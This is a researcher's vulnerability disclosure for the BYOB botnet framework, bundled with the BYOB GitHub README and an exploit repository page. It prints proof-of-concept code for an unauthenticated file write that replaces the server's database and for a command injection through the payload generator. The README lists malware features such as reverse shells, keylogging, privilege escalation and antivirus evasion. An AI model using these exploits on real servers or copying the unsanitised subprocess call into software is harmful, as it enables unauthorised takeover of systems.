=== Content from blog.chebuya.com_408b4f32_20250111_131308.html ===

[![chebuya](/avatar.jpg)](https://blog.chebuya.com/)

[Home](/)
-
[About](/about/)
[LinkedIn](https://www.linkedin.com/in/chebuya-%E2%80%8E-5a0a08294/)
[Exploit-DB](https://packetstormsecurity.com/files/author/17026/)
[HackerOne](https://hackerone.com/chebuya?type=user)
[GitHub](https://github.com/chebuya)
[Twitter](https://twitter.com/_chebuya)

# Unauthenticated remote code execution on BYOB via arbitrary file write (CVE-2024-45256) + command injection (CVE-2024-45257)

calendar

Aug 15, 2024

clock

6 min read

PoC: <https://github.com/chebuya/exploits/tree/main/BYOB-RCE>

Your browser does not support the video tag.
### Summary

[BYOB (Build Your Own Botnet)](https://github.com/malwaredllc/byob) is *an open-source post-exploitation framework for students, researchers and developers* with support for Linux, Windows and OSX systems. With approximately 9,000 stars, it ranks among the most popular post exploitation frameworks on GitHub. While auditing the codebase, I was able to discover an unauthenticated arbitrary file write in an exfiltration endpoint allowing attackers to overwrite the sqlite database on disk and bypass authentication. With authenticated access to the botnet panel, I discovered a command injection in the payload generation page. By chaining these vulnerabilities, remote unauthenticated attackers are able to take full control over the botnet server.

### Arbitrary File Write via agent exfiltration endpoint

Reminiscent of the *Skywalker* in vulnerability in Empire C2 disclosed by [@zeroSteiner](https://x.com/zeroSteiner) and [re-exploited by AceResponder](https://aceresponder.com/blog/exploiting-empire-c2-framework), the botnet backend saves exfiltrated files from agents in an insecure manner, allowing attackers to write files anywhere on the filesystem the user who is running the application has the permission to write to. Specifically, the backend makes use of the `os.path.join` function, which is [well known to create scenarios where directory traversal is possible](https://samy.blog/rtfm/).

Lets take a look at the code (which I have trimmed down for brevity) for the `/api/file/add` route, which exists in `web-gui/buildyourownbotnet/api/files/routes.py`. We can see this route accepts unauthenticated POST requests, and accepts a `filename` parameter. This `filename` parameter is passed as the final parameter in the `output_path` variable, allowing us to take full control over the `output_path` variable irregardless of previous parameters by passing a full path (ex: `filename=/tmp/win.txt`). Futhermore, the route accepts a `data` parameter, which is to be base64-decoded and written to `output_path`. This gives way to our arbitrary file write.

```
@files.route("/api/file/add", methods=["POST"])
def file_add():
	"""Upload new exfilrated file."""
	b64_data = request.form.get('data')
	...
	filename = request.form.get('filename')
	# decode any base64 values
	try:
		data = base64.b64decode(b64_data)
	except:
		if b64_data.startswith('_b64'):
			data = base64.b64decode(b64_data[6:]).decode('ascii')
		else:
			print('/api/file/add error: invalid data ' + str(b64_data))
			return
	...

	output_path = os.path.join(os.getcwd(), 'buildyourownbotnet/output', owner, 'files', filename)
	# add exfiltrated file to database
	file_dao.add_user_file(owner, filename, session, module)
	# save exfiltrated file to user directory
	with open(output_path, 'wb') as fp:
		fp.write(data)
	return filename

```

We need to leverage this arbitrary file write to RCE now. There are [a lot of ways to do this](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html) but ideally:

- Our path does not rely on the application running with elevated/root permissions, since unlike empire its not likely the botnet server is running with root perms (writing to /etc/cron.d)

- Our path does not rely on system event (login->.bashrc, overwriting app source files and waiting for reload)

- Our path does not rely on a user loading a webpage or something (adding an XSS payload to an application .js file)

The best way I found to achieve this is to overwrite the sqlite3 database that exists on file to one with empty tables. This resets the application to its initial installation state, and allows us to register an admin user as part of the setup process. After that, we can focus on the authenticated attack surface which will probably be easier to RCE from. We make use of procfs to determine the working directory of the application, from which we can find the location of the database (`/proc/self/cwd/instance/database.db`). The downside of doing this is the botnets owners will probably notice not being able to login.

This is what overwriting the database and registering a new user looks like in python code:

```
with open('database.db', 'rb') as f:
	bindata = f.read()
data = base64.b64encode(bindata).decode('ascii')
json_data = {'data': data, 'filename': '/proc/self/cwd/instance/database.db', 'type': "txt", 'owner': "admin", "module": "icloud", "session": "lol"}
headers = {
	'Content-Length': str(len(json.dumps(json_data)))
}
print("[***] Uploading database")
upload_response = session.post(f"{url}/api/file/add", data=json_data, headers=headers)
print(upload_response.status_code)
headers = {
	'User-Agent': user_agent,
	'Content-Type': 'application/x-www-form-urlencoded',
}
data = {
	'csrf_token': register_csrf,
	'username': username,
	'password': password,
	'confirm_password': password,
	'submit': 'Sign Up'
}
print("[***] Registering user   ")
register_response = s.post(f'{url}/register', headers=headers, data=data)
print(register_response.status_code)

```
### Command Injection via payload generation page

The payload generation page accepts a format, operating system and architecture parameter.

![meow1](/generation-page.png)

This page will POST to the `/api/payload/generate` page, which will accept the `payload_format`, `operating_system`, and `architecture` parameters. These parameters will be put into an `options` directory and passed to the client.py `main()` function.

```
@payload.route("/api/payload/generate", methods=["POST"])
@login_required
def payload_generate():
	"""Generates custom client scripts."""
	# required fields
	payload_format = request.form.get('format')
	operating_system = request.form.get('operating_system')
	architecture = request.form.get('architecture')
	...
	# write dropper to user's output directory and return client creation page
	options = {
		'encrypt': encrypt,
		'compress': compress,
		'freeze': freeze,
		'gui': 1,
		'owner': current_user.username,
		'operating_system': operating_system,
		'architecture': architecture
	}
	try:
		outfile = client.main('', '', '', '', '', '', **options)
		...

```

In the main function, these options are processed and passed to the `_dropper()` function.

```
# main
def main(*args, **kwargs):
    """
    Run the generator
    """
    if not kwargs:
	...
    else:
        options = collections.namedtuple('Options', ['host','port','modules','name','icon','pastebin','encrypt','compress','freeze','gui','owner','operating_system','architecture'])(*args, **kwargs)
    ...
    dropper = _dropper(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=stager)
    os.chdir('..')
    return dropper

```

The `_dropper` function, which is responsible for generating the dropper, constructs the `name` variable which is the output path for our generated droppers. We notice that options.operating\_system and options.architecture are used in the construction of the `name` variable. If the `name` variable ever gets passed to a `subprocess.Popen` call, we will be able to inject commands. We can see that if `options.freeze` is set to true (which is the case when you request to generate a binary dropper rather than a .py dropper), the `generators.freeze()` function will be called.

```
def _dropper(options, **kwargs):
    # add os/arch info to filename if freezing
    if options.freeze:
        name = 'byob_{operating_system}_{architecture}_{var}.py'.format(operating_system=options.operating_system, architecture=options.architecture, var=kwargs['var']) if not options.name else options.name
    else:
        name = 'byob_{var}.py'.format(var=kwargs['var'])
	...
    name = os.path.join(output_dir, name)
	...
    # cross-compile executable for the specified os/arch using pyinstaller docker containers
    if options.freeze:
        util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
        name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'], owner=options.owner, operating_system=options.operating_system, architecture=options.architecture)
        util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
    return name

```

In the `freeze()` function, the `operating_system` parameter and `architecture` parameter are passed directly into `subprocess.Popen()`, without any sanitization or validation whatsoever.

```
def freeze(filename, icon=None, hidden=None, owner=None, operating_system=None, architecture=None):
    """
    Compile a Python file into a standalone executable
    binary with a built-in Python interpreter
    `Required`
    :param str icon:        icon image filename
    :param str filename:    target filename
    Returns output filename as a string
    """
	...
    # cross-compile executable for the specified os/arch using pyinstaller docker containers
    process = subprocess.Popen('docker run -v "$(pwd):/src/" {docker_container}'.format(
                                src_path=os.path.dirname(path),
                                docker_container=operating_system + '-' + architecture),
                                0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE,
                                cwd=path,
                                shell=True)

```

Exploiting this in python code is quite trivial. This completes our unauthenticated RCE chain!

```
headers = {
	'User-Agent': user_agent,
	'Content-Type': 'application/x-www-form-urlencoded',
}
data = f'format=exe&operating_system=nix$({command})&architecture=amd64'
try:
	# Authenticated session
	s.post(f'{url}/api/payload/generate', headers=headers, data=data, stream=True, timeout=0.0000000000001)
except requests.exceptions.ReadTimeout:
	pass

```



=== Content from github.com_44fe5346_20250111_131310.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmalwaredllc%2Fbyob)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmalwaredllc%2Fbyob)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=malwaredllc%2Fbyob)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[malwaredllc](/malwaredllc)
/
**[byob](/malwaredllc/byob)**
Public

* [Notifications](/login?return_to=%2Fmalwaredllc%2Fbyob) You must be signed in to change notification settings
* [Fork
  2.1k](/login?return_to=%2Fmalwaredllc%2Fbyob)
* [Star
   9k](/login?return_to=%2Fmalwaredllc%2Fbyob)

An open-source post-exploitation framework for students, researchers and developers.

[byob.dev](https://byob.dev "https://byob.dev")

### License

[GPL-3.0 license](/malwaredllc/byob/blob/master/LICENSE)

[9k
stars](/malwaredllc/byob/stargazers) [2.1k
forks](/malwaredllc/byob/forks) [Branches](/malwaredllc/byob/branches) [Tags](/malwaredllc/byob/tags) [Activity](/malwaredllc/byob/activity)
 [Star](/login?return_to=%2Fmalwaredllc%2Fbyob)

 [Notifications](/login?return_to=%2Fmalwaredllc%2Fbyob) You must be signed in to change notification settings

* [Code](/malwaredllc/byob)
* [Issues
  8](/malwaredllc/byob/issues)
* [Pull requests
  0](/malwaredllc/byob/pulls)
* [Actions](/malwaredllc/byob/actions)
* [Wiki](/malwaredllc/byob/wiki)
* [Security](/malwaredllc/byob/security)
* [Insights](/malwaredllc/byob/pulse)

Additional navigation options

* [Code](/malwaredllc/byob)
* [Issues](/malwaredllc/byob/issues)
* [Pull requests](/malwaredllc/byob/pulls)
* [Actions](/malwaredllc/byob/actions)
* [Wiki](/malwaredllc/byob/wiki)
* [Security](/malwaredllc/byob/security)
* [Insights](/malwaredllc/byob/pulse)

# malwaredllc/byob

    master[Branches](/malwaredllc/byob/branches)[Tags](/malwaredllc/byob/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[765 Commits](/malwaredllc/byob/commits/master/) | | |
| [.github](/malwaredllc/byob/tree/master/.github ".github") | | [.github](/malwaredllc/byob/tree/master/.github ".github") |  |  |
| [byob](/malwaredllc/byob/tree/master/byob "byob") | | [byob](/malwaredllc/byob/tree/master/byob "byob") |  |  |
| [web-gui](/malwaredllc/byob/tree/master/web-gui "web-gui") | | [web-gui](/malwaredllc/byob/tree/master/web-gui "web-gui") |  |  |
| [.coveragerc](/malwaredllc/byob/blob/master/.coveragerc ".coveragerc") | | [.coveragerc](/malwaredllc/byob/blob/master/.coveragerc ".coveragerc") |  |  |
| [.gitattributes](/malwaredllc/byob/blob/master/.gitattributes ".gitattributes") | | [.gitattributes](/malwaredllc/byob/blob/master/.gitattributes ".gitattributes") |  |  |
| [.gitignore](/malwaredllc/byob/blob/master/.gitignore ".gitignore") | | [.gitignore](/malwaredllc/byob/blob/master/.gitignore ".gitignore") |  |  |
| [.travis.yml](/malwaredllc/byob/blob/master/.travis.yml ".travis.yml") | | [.travis.yml](/malwaredllc/byob/blob/master/.travis.yml ".travis.yml") |  |  |
| [LICENSE](/malwaredllc/byob/blob/master/LICENSE "LICENSE") | | [LICENSE](/malwaredllc/byob/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/malwaredllc/byob/blob/master/README.md "README.md") | | [README.md](/malwaredllc/byob/blob/master/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
* GPL-3.0 license

[![Banner](https://github.com/malwaredllc/byob/raw/master/byob/static/byob_logo_black.svg)](https://github.com/malwaredllc/byob/blob/master/byob/static/byob_logo_black.svg)

[![license](https://camo.githubusercontent.com/5816e1534cc17c8d8f94ecaf376d4499e8538ca1def8fe891d47ffef0d407e92/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d47504c2d627269676874677265656e2e737667)](https://github.com/malwaredllc/byob/blob/master/LICENSE)
[![version](https://camo.githubusercontent.com/3c5e0ea12311bf9ce0d9203a98d22c6040b08ad2220f0ba11db0c92e1dcccb4f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f76657273696f6e2d322e302d626c75652e737667)](https://github.com/malwaredllc/byob)
[![Coverage Status](https://camo.githubusercontent.com/bcc24b3fb4cd1e7b1bff93b19644469a462874a73eb7f1c824fcba4bc9a218a2/68747470733a2f2f636f766572616c6c732e696f2f7265706f732f6769746875622f6d616c77617265646c6c632f62796f622f62616467652e737667)](https://coveralls.io/github/malwaredllc/byob)
[![Discord](https://camo.githubusercontent.com/e6b2c6cc42724d60ddeaec5d97aeb75b8dd51df062f19cadbef1bd49b743e474/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f373039313530353230343436353530303937)](https://camo.githubusercontent.com/e6b2c6cc42724d60ddeaec5d97aeb75b8dd51df062f19cadbef1bd49b743e474/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f373039313530353230343436353530303937)
[![Tweet](https://camo.githubusercontent.com/4f677ce944dfdeb7a8cd741560d35d006363ef6160adeb63ee3d8c73373b1f51/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f75726c2f687474702f736869656c64732e696f2e7376673f7374796c653d736f6369616c)](https://twitter.com/intent/tweet?text=BYOB%20(Post-Exploitation%20Framework)&url=https://github.com/malwaredllc/byob&via=malwaredllc&hashtags=byob,python,security,github)

**Questions?** Check out the [docs](https://github.com/malwaredllc/byob/wiki) or join our [Discord support server](https://discord.gg/8FsSrw7)

**Disclaimer**: This project should be used for authorized testing or educational purposes only.

BYOB is an open-source post-exploitation framework for students, researchers and developers. It includes features such as:

* Command & control server with intuitive user-interface
* Custom payload generator for multiple platforms
* 12 post-exploitation modules

It is designed to allow students and developers to easily implement their own code and add cool new
features *without* having to write a C2 server or Remote Administration Tool from scratch.

This project has 2 main parts: the **original console-based application** (`/byob`) and the **web GUI** (`/web-gui`).

# Web GUI

## Dashboard

A control panel for your C2 server with a point-and-click interface for executing post-exploitation modules. The control panel includes an interactive map of client machines and a dashboard which allows efficient, intuitive administration of client machines.

[![dashboard_preview](https://github.com/malwaredllc/byob/raw/master/web-gui/buildyourownbotnet/assets/images/previews/preview-dashboard.png)](https://github.com/malwaredllc/byob/blob/master/web-gui/buildyourownbotnet/assets/images/previews/preview-dashboard.png)

## Payload Generator

The payload generator uses black magic involving Docker containers & Wine servers to compile executable payloads for any platform/architecture you select. These payloads spawn reverse TCP shells with communication over the network encrypted via AES-256 after generating a secure symmetric key using the [Diffie-Hellman IKE](https://tools.ietf.org/html/rfc2409).

[![payloads_preview](https://github.com/malwaredllc/byob/raw/master/web-gui/buildyourownbotnet/assets/images/previews/preview-payloads2.png)](https://github.com/malwaredllc/byob/blob/master/web-gui/buildyourownbotnet/assets/images/previews/preview-payloads2.png)

## Terminal Emulator

The web app includes an in-browser terminal emulator so you can still have direct shell access even when using the web GUI.

[![terminal_preview](https://github.com/malwaredllc/byob/raw/master/web-gui/buildyourownbotnet/assets/images/previews/preview-shell.png)](https://github.com/malwaredllc/byob/blob/master/web-gui/buildyourownbotnet/assets/images/previews/preview-shell.png)

# Console Application

## Client

[![client](https://camo.githubusercontent.com/5ecd2b1c68e3debdbf9ee705b10b9d223be60be44b7f3d888e2968d188c8fce1/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f62796f622d636c69656e742d626c75652e737667)](https://github.com/malwaredllc/byob/blob/master/byob/payloads.py)

*Generate fully-undetectable clients with staged payloads, remote imports, and unlimited post-exploitation modules*

1. **Remote Imports**: remotely import third-party packages from the server without writing them
   to the disk or downloading/installing them
2. **Nothing Written To The Disk**: clients never write anything to the disk - not even temporary files (zero IO
   system calls are made) because remote imports allow arbitrary code to be
   dynamically loaded into memory and directly imported into the currently running
   process
3. **Zero Dependencies (Not Even Python Itself)**: client runs with just the python standard library, remotely imports any non-standard
   packages/modules from the server, and can be compiled with a standalone python
   interpreter into a portable binary executable formatted for any platform/architecture,
   allowing it to run on anything, even when Python itself is missing on the target host
4. **Add New Features With Just 1 Click**: any python script, module, or package you copy to the `./byob/modules/` directory
   automatically becomes remotely importable & directly usable by every client while
   your command & control server is running
5. **Write Your Own Modules**: a basic module template is provided in `./byob/modules/` directory to make writing
   your own modules a straight-forward, hassle-free process
6. **Run Unlimited Modules Without Bloating File Size**: use remote imports to add unlimited features without adding a single byte to the
   client's file size
7. **Fully Updatable**: each client will periodically check the server for new content available for
   remote import, and will dynamically update its in-memory resources
   if anything has been added/removed
8. **Platform Independent**: everything is written in Python (a platform-agnostic language) and the clients
   generated can optionally be compiled into a portable executable (*Windows*) or
   bundled into a standalone application (*macOS*)
9. **Bypass Firewalls**: clients connect to the command & control server via reverse TCP connections, which
   will bypass most firewalls because the default filter configurations primarily
   block incoming connections
10. **Counter-Measure Against Antivirus**: avoids being analyzed by antivirus by blocking processes with names of known antivirus
    products from spawning
11. **Encrypt Payloads To Prevent Analysis**: the main client payload is encrypted with a random 256-bit key which exists solely
    in the payload stager which is generated along with it
12. **Prevent Reverse-Engineering**: by default, clients will abort execution if a virtual machine or sandbox is detected

## Modules

[![modules](https://camo.githubusercontent.com/cd99b4789f1d0d409189fdd78b4149aba21a831c6754c2b3d9cf32cfe4939a4b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f62796f622d6d6f64756c65732d626c75652e737667)](https://github.com/malwaredllc/byob/blob/master/byob/modules)

*Post-exploitation modules that are remotely importable by clients*

1. **Persistence** (`byob.modules.persistence`): establish persistence on the host machine using 5 different methods
2. **Packet Sniffer** (`byob.modules.packetsniffer`): run a packet sniffer on the host network & upload .pcap file
3. **Escalate Privileges** (`byob.modules.escalate`): attempt UAC bypass to gain unauthorized administrator privileges
4. **Port Scanner** (`byob.modules.portscanner`): scan the local network for other online devices & open ports
5. **Keylogger** (`byob.modules.keylogger`): logs the user’s keystrokes & the window name entered
6. **Screenshot** (`byob.modules.screenshot`): take a screenshot of current user’s desktop
7. **Outlook** (`byob.modules.outlook`): read/search/upload emails from the local Outlook client
8. **Process Control** (`byob.modules.process`): list/search/kill/monitor currently running processes on the host
9. **iCloud** (`byob.modules.icloud`): check for logged in iCloud account on macOS

## Server

[![server](https://camo.githubusercontent.com/d36e58741aa422c0260b10b996cb2c57e8d1ab1e615fa0e70b83b85e207d241e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f62796f622d7365727665722d626c75652e737667)](https://github.com/malwaredllc/byob/blob/master/byob/server.py)

*Command & control server with persistent database and console*

1. **Console-Based User-Interface**: streamlined console interface for controlling client host machines remotely via
   reverse TCP shells which provide direct terminal access to the client host machines
2. **Persistent SQLite Database**: lightweight database that stores identifying information about client host machines,
   allowing reverse TCP shell sessions to persist through disconnections of arbitrary
   duration and enabling long-term reconnaissance
3. **Client-Server Architecture**: all python packages/modules installed locally are automatically made available for clients
   to remotely import without writing them to the disk of the target machines, allowing clients to use modules which require
   packages not installed on the target machines

## Core

[![core](https://camo.githubusercontent.com/99505f7993e92257b4da3efa4582130a575929bb22d249509ea6ba747f2a75dd/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f62796f622d636f72652d626c75652e737667)](https://github.com/malwaredllc/byob/blob/master/byob/core)

*Core framework modules used by the generator and the server*

1. **Utilities** (`byob.core.util`): miscellaneous utility functions that are used by many modules
2. **Security** (`byob.core.security`): Diffie-Hellman IKE & 3 encryption modes (AES-256-OCB, AES-256-CBC, XOR-128)
3. **Loaders** (`byob.core.loaders`): remotely import any package/module/scripts from the server
4. **Payloads** (`byob.core.payloads`): reverse TCP shell designed to remotely import dependencies, packages & modules
5. **Stagers** (`byob.core.stagers`): generate unique payload stagers to prevent analysis & detection
6. **Generators** (`byob.core.generators`): functions which all dynamically generate code for the client generator
7. **DAO** (`byob.core.dao`): handles interaction between command & control server and the SQLite database
8. **Handler** (`byob.core.handler`): HTTP POST request handler for remote file uploads to the server

---

### To Do

*Contributors welcome! Feel free to issue pull-requests with any new features or improvements you have come up with!*

1. **Remote Import Encryption** - encryption for data streams of packages/modules being remotely imported (to maintain confidentiality/authenticity/integrity and prevent any remote code execution vulnerabilities arising from deserialization)
2. **Transport Types** - add support for more transport types (HTTP/S, DNS, etc.)
3. **Bug Fixes** - fix any bugs/issues

## About

An open-source post-exploitation framework for students, researchers and developers.

[byob.dev](https://byob.dev "https://byob.dev")

### Topics

[encrypted-connections](/topics/encrypted-connections "Topic: encrypted-connections")
[post-exploitation](/topics/post-exploitation "Topic: post-exploitation")
[platform-independent](/topics/platform-independent "Topic: platform-independent")
[no-dependencies](/topics/no-dependencies "Topic: no-dependencies")
[reverse-shells](/topics/reverse-shells "Topic: reverse-shells")

### Resources

[Readme](#readme-ov-file)
### License

[GPL-3.0 license](#GPL-3.0-1-ov-file)

[Activity](/malwaredllc/byob/activity)
### Stars

[**9k**
stars](/malwaredllc/byob/stargazers)
### Watchers

[**322**
watching](/malwaredllc/byob/watchers)
### Forks

[**2.1k**
forks](/malwaredllc/byob/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fmalwaredllc%2Fbyob&report=malwaredllc+%28user%29)

## [Releases](/malwaredllc/byob/releases)

[1
tags](/malwaredllc/byob/tags)

## Sponsor this project

* [paypal.me/donatebyob](http://paypal.me/donatebyob)

## [Contributors 28](/malwaredllc/byob/graphs/contributors)

[+ 14 contributors](/malwaredllc/byob/graphs/contributors)

## Languages

* [Python
  75.7%](/malwaredllc/byob/search?l=python)
* [HTML
  19.8%](/malwaredllc/byob/search?l=html)
* [Shell
  3.8%](/malwaredllc/byob/search?l=shell)
* [PHP
  0.7%](/malwaredllc/byob/search?l=php)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_99c9a3e6_20250111_131309.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchebuya%2Fexploits%2Ftree%2Fmain%2FBYOB-RCE)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchebuya%2Fexploits%2Ftree%2Fmain%2FBYOB-RCE)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=chebuya%2Fexploits)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[chebuya](/chebuya)
/
**[exploits](/chebuya/exploits)**
Public

* [Notifications](/login?return_to=%2Fchebuya%2Fexploits) You must be signed in to change notification settings
* [Fork
  8](/login?return_to=%2Fchebuya%2Fexploits)
* [Star
   30](/login?return_to=%2Fchebuya%2Fexploits)

* [Code](/chebuya/exploits)
* [Issues
  0](/chebuya/exploits/issues)
* [Pull requests
  0](/chebuya/exploits/pulls)
* [Actions](/chebuya/exploits/actions)
* [Projects
  0](/chebuya/exploits/projects)
* [Security](/chebuya/exploits/security)
* [Insights](/chebuya/exploits/pulse)

Additional navigation options

* [Code](/chebuya/exploits)
* [Issues](/chebuya/exploits/issues)
* [Pull requests](/chebuya/exploits/pulls)
* [Actions](/chebuya/exploits/actions)
* [Projects](/chebuya/exploits/projects)
* [Security](/chebuya/exploits/security)
* [Insights](/chebuya/exploits/pulse)

## Files

 main
## Breadcrumbs

1. [exploits](/chebuya/exploits/tree/main)
/
# BYOB-RCE

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/chebuya/exploits/commits/main/BYOB-RCE) main
## Breadcrumbs

1. [exploits](/chebuya/exploits/tree/main)
/
# BYOB-RCE

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/chebuya/exploits/tree/main) | | |
| [README.md](/chebuya/exploits/blob/main/BYOB-RCE/README.md "README.md") | | [README.md](/chebuya/exploits/blob/main/BYOB-RCE/README.md "README.md") |  |  |
